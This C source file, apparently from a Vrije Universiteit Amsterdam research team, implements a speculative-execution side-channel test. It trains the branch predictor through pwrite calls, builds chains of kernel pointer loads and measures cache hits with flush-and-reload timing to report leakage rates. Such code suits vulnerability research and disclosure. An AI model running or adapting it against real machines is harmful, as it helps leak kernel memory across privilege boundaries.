/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "flush_and_reload.h"
#include "targets.h"
#include "common.h"

// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------


void set_load_chain_simple_touch(struct config * cfg, int number_of_loads) {


    assert(number_of_loads > 0);

    memset(cfg->ind_map, 0, 0x100);

    cfg->gadget_arg = cfg->ind_map_kern;

    if (number_of_loads == 1) {
        cfg->gadget_arg = cfg->fr_buf_kern;
        return;
    }


    for (size_t i = 0; i < number_of_loads - 2; i++)
    {
        *(uint64_t *)(cfg->ind_map + (i * 0x8)) = (uint64_t) (cfg->ind_map_kern + ((1 + i) * 0x8));
    }

    *(uint64_t *) (cfg->ind_map + ((number_of_loads - 2)* 0x8)) =  (uint64_t) cfg->fr_buf_kern;


}

// ----------------------------------------------------------------------------
// Leak helper functions
//
// ----------------------------------------------------------------------------


uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    char buf[17];
    char buf_train[17];
    uint64_t len_buf, len_buf_train;
    uint64_t hits = 0;

    snprintf(buf, 17, "%lx", (size_t) cfg->gadget_arg);
    snprintf(buf_train, 17, "%lx", (size_t) cfg->ind_map_train_kern);

    len_buf = strlen(buf);
    len_buf_train = strlen(buf_train);


    *(volatile uint64_t *)cfg->ind_map;
    *(volatile uint64_t *)cfg->ind_map + 64;



    for(int iter=0; iter < iterations; iter++) {


        for (size_t i = 0; i < 2; i++)
        {
            cfg->pht_cfg->jmp_entry(cfg->pht_cfg->history_take);
            cfg->pht_cfg->jmp_entry(cfg->pht_cfg->history_not_take);
        }

        cpuid();


        asm volatile("clflush (%0)\n"::"r"(cfg->reload_addr));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->ind_map_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->gadget_arg));

        cpuid();

        // train
        assert(pwrite(cfg->fd_caller_train, buf_train, len_buf_train, 0) > 0);
        assert(pwrite(cfg->fd_caller_train, buf_train, len_buf_train, 0) > 0);

        // test
        assert(pwrite(cfg->fd_caller_test, buf, len_buf, 0) > 0);

        cpuid();


        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }

        }
    }

    return hits;


}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

#define NLOADS 8
void print_leakage_rate(struct config * cfg, uint64_t iterations) {

    uint64_t hits[NLOADS] = {0};
    cfg->reload_addr = cfg->fr_buf;

    // for (int l = 0; l < (NLOADS * 2); l++)
    for (int l = 0; l < NLOADS; l++)
    {
        set_load_chain_simple_touch(cfg, (l % NLOADS) + 1);

        hits[l % NLOADS] += do_flush_and_reload(cfg, iterations, 0);

    }

    for (int l = 0; l < NLOADS; l++)
    {
        printf("%5ld %6.2f%% | ", hits[l], ((float) hits[l] / iterations) * 100);
        fflush(stdout);
    }


    printf("\n");


}

